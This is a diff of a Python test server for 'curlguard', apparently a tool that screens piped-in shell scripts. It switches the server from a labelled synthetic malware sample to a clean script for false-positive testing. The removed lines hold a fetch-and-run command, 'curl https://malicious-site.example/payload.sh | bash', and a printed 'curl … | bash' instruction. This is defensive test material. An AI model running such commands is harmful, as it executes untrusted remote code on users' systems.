@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Serve a synthetic malicious script for curlguard end-to-end testing."""
+"""Serve a clean script for curlguard false-positive testing."""
 
 import http.server
 import os
@@ -7,14 +7,13 @@ import socketserver
 import threading
 import time
 
-PORT = 8888
+PORT = 8889
 TTL_SECONDS = 180
 
-MALWARE_SCRIPT = b"""#!/bin/bash
-# SYNTHETIC MALWARE SAMPLE FOR CURLGUARD TESTING ONLY
-echo "Simulating a suspicious installer..."
-curl https://malicious-site.example/payload.sh | bash
-echo "If you see this after choosing Block, the prompt flow did not stop delivery."
+SAFE_SCRIPT = b"""#!/bin/bash
+set -e
+echo "curlguard clean test script"
+echo "This script is expected to pass without opening the review prompt."
 """
 
 
@@ -24,15 +23,15 @@ class ReusableTCPServer(socketserver.TCPServer):
 
 class QuietHandler(http.server.BaseHTTPRequestHandler):
     def do_GET(self) -> None:
-        if self.path != "/test.sh":
+        if self.path != "/install.sh":
             self.send_error(404)
             return
 
         self.send_response(200)
         self.send_header("Content-Type", "text/plain; charset=utf-8")
-        self.send_header("Content-Length", str(len(MALWARE_SCRIPT)))
+        self.send_header("Content-Length", str(len(SAFE_SCRIPT)))
         self.end_headers()
-        self.wfile.write(MALWARE_SCRIPT)
+        self.wfile.write(SAFE_SCRIPT)
 
     def log_message(self, format: str, *args) -> None:
         return
@@ -49,13 +48,13 @@ def main() -> None:
 
         threading.Thread(target=expire, daemon=True).start()
 
-        print(f"curlguard true-positive server is running on http://127.0.0.1:{PORT}", flush=True)
-        print("Serving: /test.sh", flush=True)
-        print("Expected result: curlguard opens an interactive review prompt.", flush=True)
+        print(f"curlguard true-negative server is running on http://127.0.0.1:{PORT}", flush=True)
+        print("Serving: /install.sh", flush=True)
+        print("Expected result: the file downloads without a malware prompt.", flush=True)
         print(f"Server lifetime: {TTL_SECONDS} seconds", flush=True)
         print("", flush=True)
         print("Run in another terminal:", flush=True)
-        print("  curl http://127.0.0.1:8888/test.sh | bash", flush=True)
+        print("  curl http://127.0.0.1:8889/install.sh -o /tmp/curlguard-demo.sh", flush=True)
         print("", flush=True)
 
         try:
